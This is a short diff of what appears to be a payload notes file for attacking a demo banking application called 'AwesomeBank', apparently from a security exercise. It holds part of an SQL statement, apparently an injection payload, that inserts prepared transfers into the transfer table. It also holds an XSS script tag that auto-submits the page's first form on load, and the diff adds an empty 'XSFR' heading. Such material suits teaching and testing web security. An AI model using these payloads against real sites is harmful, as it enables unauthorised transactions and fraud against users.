@@ -9,3 +9,5 @@ INSERT INTO AwesomeBank_transfer SELECT * FROM AwesomeBank_preparedtransfer WHER
 
 XSS:
 <script>window.addEventListener('load', function(){document.getElementsByTagName("form")[0].submit()})</script>
+
+XSFR:
